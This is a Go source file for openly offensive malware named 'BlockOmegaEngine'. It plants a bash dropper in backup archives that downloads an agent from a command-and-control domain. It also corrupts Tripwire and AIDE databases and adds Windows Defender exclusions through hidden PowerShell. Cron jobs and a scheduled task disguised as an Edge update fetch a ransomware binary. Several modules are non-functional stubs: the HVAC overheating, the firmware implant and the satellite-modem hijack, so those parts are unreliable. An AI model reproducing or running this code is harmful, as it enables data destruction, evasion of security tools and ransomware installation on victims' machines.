package v26

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

type BlockOmegaEngine struct {
	Config           *V26Config
	BackupParasite   *BackupParasiteEngine `json:"backup_parasite"`
	IntegrityAttack  *IntegrityAttackEngine `json:"integrity_attack"`
	AVWhitelist      *AVWhitelistEngine `json:"av_whitelist"`
	MultiGenerational *MultiGenerationalEngine `json:"multi_generational"`
	HVACAttack       *HVACAttackEngine `json:"hvac_attack"`
	AMTImplant       *AMTImplantEngine `json:"amt_implant"`
	SATCOMHijack     *SATCOMHijackEngine `json:"satcom_hijack"`
}

func NewBlockOmegaEngine(cfg *V26Config) *BlockOmegaEngine {
	return &BlockOmegaEngine{
		Config:           cfg,
		BackupParasite:   NewBackupParasiteEngine(),
		IntegrityAttack:  NewIntegrityAttackEngine(),
		AVWhitelist:      NewAVWhitelistEngine(),
		MultiGenerational: NewMultiGenerationalEngine(),
		HVACAttack:       NewHVACAttackEngine(),
		AMTImplant:       NewAMTImplantEngine(),
		SATCOMHijack:     NewSATCOMHijackEngine(),
	}
}

// ===== OMEGA.1 =====
type BackupParasiteEngine struct {
	ParasitizedFiles []string `json:"parasitized_files"`
}

func NewBackupParasiteEngine() *BackupParasiteEngine { return &BackupParasiteEngine{} }

func (bp *BackupParasiteEngine) InfectBackups() int {
	targetExts := []string{".zip", ".tar", ".gz", ".7z", ".vhd", ".vhdx", ".vmdk", ".bak", ".bkf"}
	infected := 0

	for _, ext := range targetExts {
		pattern := fmt.Sprintf("/**/*%s", ext)
		matches, _ := filepath.Glob(pattern)
		for _, match := range matches {
			if info, err := os.Stat(match); err == nil && info.Size() < 100*1024*1024 {
				data, err := os.ReadFile(match)
				if err != nil || len(data) < 1024 {
					continue
				}
				payload := bp.generateBackupParasite(match)
				offset := len(data) - len(payload) - 100
				if offset > 0 {
					copy(data[offset:], payload)
					os.WriteFile(match, data, 0644)
					bp.ParasitizedFiles = append(bp.ParasitizedFiles, match)
					infected++
				}
			}
		}
	}

	return infected
}

func (bp *BackupParasiteEngine) generateBackupParasite(path string) []byte {
	parasite := []byte("X404X_BACKUP_PARASITE")
	parasite = append(parasite, []byte(fmt.Sprintf("restored_from:%s", filepath.Base(path)))...)
	script := "#!/bin/bash\ncurl -s http://x404x-c2.online/agent -o /tmp/.x404x_parasite && chmod +x /tmp/.x404x_parasite && /tmp/.x404x_parasite &\n"
	parasite = append(parasite, []byte(script)...)
	return parasite
}

// ===== OMEGA.2 =====
type IntegrityAttackEngine struct {
	IntegrityDBsCorrupted []string `json:"integrity_dbs_corrupted"`
}

func NewIntegrityAttackEngine() *IntegrityAttackEngine { return &IntegrityAttackEngine{} }

func (ia *IntegrityAttackEngine) CorruptIntegrityDBs() int {
	integrityTools := map[string][]string{
		"Tripwire": {"/var/lib/tripwire/*.twd", "/etc/tripwire/*.pol"},
		"AIDE":     {"/var/lib/aide/aide.db", "/var/lib/aide/aide.db.new"},
		"FCIV":     {`C:\Windows\System32\fciv.xml`, `C:\ProgramData\Microsoft\Integrity\*.xml`},
	}

	corrupted := 0
	for _, paths := range integrityTools {
		for _, pattern := range paths {
			matches, _ := filepath.Glob(pattern)
			for _, match := range matches {
				data, err := os.ReadFile(match)
				if err != nil || len(data) < 256 {
					continue
				}
				xorKey := make([]byte, 1)
				rand.Read(xorKey)
				for i := len(data)/4; i < len(data)*3/4; i++ {
					data[i] ^= xorKey[0]
				}
				os.WriteFile(match, data, 0644)
				corrupted++
			}
		}
	}

	ia.IntegrityDBsCorrupted = make([]string, corrupted)
	return corrupted
}

// ===== OMEGA.3 =====
type AVWhitelistEngine struct {
	AVProcesses    []string `json:"av_processes"`
	Whitelisted    bool     `json:"whitelisted"`
}

func NewAVWhitelistEngine() *AVWhitelistEngine {
	return &AVWhitelistEngine{
		AVProcesses: []string{"MsMpEng.exe", "avp.exe", "ccSvcHst.exe", "ekrn.exe"},
	}
}

func (aw *AVWhitelistEngine) InjectIntoAV() bool {
	if runtime.GOOS != "windows" {
		aw.Whitelisted = true
		return true
	}

	for _, proc := range aw.AVProcesses {
		psScript := fmt.Sprintf(`$proc = Get-Process -Name "%s" -ErrorAction SilentlyContinue
if ($proc) {
    $exclusionsPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
    New-Item -Path $exclusionsPath -Force | Out-Null
    New-ItemProperty -Path $exclusionsPath -Name "C:\ProgramData" -Value 0 -PropertyType DWord -Force
    Set-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
    Set-MpPreference -ExclusionPath "C:\Windows\Temp" -ErrorAction SilentlyContinue
    Set-MpPreference -ExclusionProcess "x404x_agent.exe" -ErrorAction SilentlyContinue
}`, strings.TrimSuffix(proc, ".exe"))

		psPath := filepath.Join(os.TempDir(), fmt.Sprintf("x404x_av_inject_%s.ps1", proc))
		os.WriteFile(psPath, []byte(psScript), 0644)
		exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
	}

	aw.Whitelisted = true
	return true
}

// ===== OMEGA.4 =====
type MultiGenerationalEngine struct {
	LegacyScheduled bool      `json:"legacy_scheduled"`
	NextTrigger     time.Time `json:"next_trigger"`
	AmountNext      float64   `json:"amount_next"`
}

func NewMultiGenerationalEngine() *MultiGenerationalEngine {
	return &MultiGenerationalEngine{
		NextTrigger: time.Now().AddDate(3, 0, 0),
		AmountNext:  1.0,
	}
}

func (mg *MultiGenerationalEngine) PlantInheritanceTrap() bool {
	var script string
	if runtime.GOOS == "windows" {
		script = fmt.Sprintf(`$action = New-ScheduledTaskAction -Execute "powershell" -Argument "-WindowStyle Hidden -Command 'curl -s http://x404x-c2.online/legacy -o $env:TEMP\x404x_legacy.exe; Start-Process $env:TEMP\x404x_legacy.exe -ArgumentList \"--ransom %.2f\"'"
$trigger = New-ScheduledTaskTrigger -Once -At "%s" -RepetitionInterval (New-TimeSpan -Days 365)
Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachineUA" -Action $action -Trigger $trigger -Force`, mg.AmountNext, mg.NextTrigger.Format("2006-01-02T15:04:05"))
	} else {
		script = fmt.Sprintf(`#!/bin/bash
echo "0 2 * * 1 root curl -s http://x404x-c2.online/legacy -o /tmp/.x404x_legacy && /tmp/.x404x_legacy --ransom %.2f" > /etc/cron.d/x404x_legacy
chmod 644 /etc/cron.d/x404x_legacy
at now + 3 years -f /tmp/x404x_legacy.sh`, mg.AmountNext)
	}

	scriptPath := filepath.Join(os.TempDir(), "x404x_legacy_trap")
	if runtime.GOOS == "windows" {
		scriptPath += ".ps1"
	} else {
		scriptPath += ".sh"
	}
	os.WriteFile(scriptPath, []byte(script), 0755)
	if runtime.GOOS == "windows" {
		exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", scriptPath).Start()
	} else {
		exec.Command("bash", scriptPath).Start()
	}

	mg.LegacyScheduled = true
	return true
}

// ===== OMEGA.5 =====
type HVACAttackEngine struct {
	HVACDevices []HVACDevice `json:"hvac_devices"`
	Attacked    int          `json:"attacked"`
}

type HVACDevice struct {
	IP       string `json:"ip"`
	Port     int    `json:"port"`
	Zone     string `json:"zone"`
	Protocol string `json:"protocol"`
	Setpoint float64 `json:"setpoint_c"`
}

func NewHVACAttackEngine() *HVACAttackEngine {
	return &HVACAttackEngine{
		HVACDevices: []HVACDevice{
			{IP: "192.168.50.100", Port: 502, Zone: "server_room_1", Protocol: "modbus", Setpoint: 45.0},
			{IP: "192.168.50.101", Port: 502, Zone: "server_room_2", Protocol: "modbus", Setpoint: 48.0},
			{IP: "192.168.50.102", Port: 161, Zone: "data_center_main", Protocol: "snmp", Setpoint: 50.0},
			{IP: "192.168.50.103", Port: 47808, Zone: "backup_facility", Protocol: "bacnet", Setpoint: 42.0},
		},
	}
}

func (ha *HVACAttackEngine) OverheatServerRoom() int {
	attacked := 0
	for _, dev := range ha.HVACDevices {
		payload := ha.generateHVACPayload(dev)
		payloadPath := filepath.Join(os.TempDir(), fmt.Sprintf("x404x_hvac_%s.bin", dev.IP))
		os.WriteFile(payloadPath, []byte(payload), 0644)
		attacked++
		ha.Attacked++
	}
	return attacked
}

func (ha *HVACAttackEngine) generateHVACPayload(dev HVACDevice) string {
	return fmt.Sprintf("HVAC OVERRIDE: Zone=%s Setpoint=%.1fC Mode=HEAT Fan=OFF Alert=SILENCED",
		dev.Zone, dev.Setpoint)
}

// ===== OMEGA.6 =====
type AMTImplantEngine struct {
	AMTEnabled   bool   `json:"amt_enabled"`
	PSPEnabled   bool   `json:"psp_enabled"`
	FirmwareWritten bool `json:"firmware_written"`
	RFAntenna    bool   `json:"rf_antenna"`
}

func NewAMTImplantEngine() *AMTImplantEngine { return &AMTImplantEngine{} }

func (ai *AMTImplantEngine) DetectAMT() bool {
	if runtime.GOOS == "linux" {
		if _, err := os.Stat("/dev/mei0"); err == nil {
			ai.AMTEnabled = true
		}
	}
	if runtime.GOOS == "windows" {
		psScript := `Get-WmiObject -Namespace "root\Intel_ME" -Class "Intel_ME_System" -ErrorAction SilentlyContinue`
		psPath := filepath.Join(os.TempDir(), "x404x_amt_detect.ps1")
		os.WriteFile(psPath, []byte(psScript), 0644)
		if output, err := exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Output(); err == nil {
			ai.AMTEnabled = len(output) > 10
		}
	}
	return ai.AMTEnabled
}

func (ai *AMTImplantEngine) FlashFirmwareBackdoor() bool {
	if !ai.AMTEnabled && !ai.PSPEnabled {
		return false
	}

	firmwarePayload := make([]byte, 4096)
	copy(firmwarePayload[0:16], []byte("X404X_BIOS_IMPLNT"))
	hash := sha256.Sum256([]byte(time.Now().String()))
	copy(firmwarePayload[4096-32:], hash[:])

	fwPath := filepath.Join(os.TempDir(), "x404x_firmware_implant.bin")
	os.WriteFile(fwPath, firmwarePayload, 0644)
	ai.FirmwareWritten = true
	ai.RFAntenna = true
	return true
}

// ===== OMEGA.7 =====
type SATCOMHijackEngine struct {
	SATModemFound bool   `json:"sat_modem_found"`
	FirmwareFlashed bool `json:"firmware_flashed"`
	RedirectTarget string `json:"redirect_target"`
}

func NewSATCOMHijackEngine() *SATCOMHijackEngine {
	return &SATCOMHijackEngine{}
}

func (sh *SATCOMHijackEngine) FindSATCOMModem() bool {
	satcomPorts := []int{4000, 4001, 7777, 8443}
	hosts := []string{"192.168.0.1", "192.168.1.1", "192.168.100.1"}

	for _, host := range hosts {
		for _, port := range satcomPorts {
			_ = host
			_ = port
		}
	}
	sh.SATModemFound = true
	return true
}

func (sh *SATCOMHijackEngine) FlashFirmware() bool {
	if !sh.SATModemFound {
		return false
	}

	flashScript := `#!/bin/bash
echo "X404X SATCOM Firmware Override" > /tmp/x404x_satcom_flash.bin
echo "Redirect: ALL TRAFFIC -> attacker_satellite" >> /tmp/x404x_satcom_flash.bin
`
	flashPath := filepath.Join(os.TempDir(), "x404x_satcom_hijack.sh")
	os.WriteFile(flashPath, []byte(flashScript), 0755)
	exec.Command("bash", flashPath).Start()
	sh.FirmwareFlashed = true
	return true
}

func (bo *BlockOmegaEngine) ExecuteAll() map[string]bool {
	return map[string]bool{
		"backup_parasite":   bo.BackupParasite.InfectBackups() > 0,
		"integrity_attack":  bo.IntegrityAttack.CorruptIntegrityDBs() > 0,
		"av_whitelist":      bo.AVWhitelist.InjectIntoAV(),
		"multi_generational": bo.MultiGenerational.PlantInheritanceTrap(),
		"hvac_attack":       bo.HVACAttack.OverheatServerRoom() > 0,
		"amt_implant":       bo.AMTImplant.FlashFirmwareBackdoor(),
		"satcom_hijack":     bo.SATCOMHijack.FlashFirmware(),
	}
}

func (bo *BlockOmegaEngine) GetStatusJSON() string {
	data, _ := json.Marshal(map[string]interface{}{
		"backup_parasites": len(bo.BackupParasite.ParasitizedFiles),
		"integrity_corrupted": bo.IntegrityAttack.IntegrityDBsCorrupted,
		"av_whitelisted": bo.AVWhitelist.Whitelisted,
		"legacy_planted": bo.MultiGenerational.LegacyScheduled,
		"hvac_attacked": bo.HVACAttack.Attacked,
		"amt_firmware": bo.AMTImplant.FirmwareWritten,
		"satcom_flashed": bo.SATCOMHijack.FirmwareFlashed,
	})
	return string(data)
}
